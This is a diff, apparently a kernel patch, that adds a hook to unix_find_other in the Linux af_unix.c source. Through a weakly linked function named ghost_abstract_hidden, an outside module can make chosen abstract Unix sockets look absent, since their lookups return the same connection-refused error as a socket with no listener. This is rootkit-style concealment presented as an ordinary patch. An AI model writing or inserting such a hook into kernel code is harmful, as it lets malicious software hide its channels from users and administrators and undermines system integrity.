@@ -1,0 +1,21 @@
+--- a/net/unix/af_unix.c
++++ b/net/unix/af_unix.c
+@@ -1045,6 +1045,18 @@ static struct sock *unix_find_other(struct net *net,
+ 		}
+ 	} else {
+ 		err = -ECONNREFUSED;
++		{
++			/* err is already -ECONNREFUSED, and fail: returns it exactly as
++			 * the no-listener path below does, so a hidden @name reads as
++			 * absent. Covers connect(2) and sendto(2) both.
++			 */
++			extern bool ghost_abstract_hidden(const char *gname, int glen) __attribute__((weak));
++
++			if (ghost_abstract_hidden &&
++			    ghost_abstract_hidden(sunname->sun_path + 1,
++						  len - offsetof(struct sockaddr_un, sun_path) - 1))
++				goto fail;
++		}
+ 		u = unix_find_socket_byname(net, sunname, len, type ^ hash);
+ 		if (u) {
+ 			struct dentry *dentry;
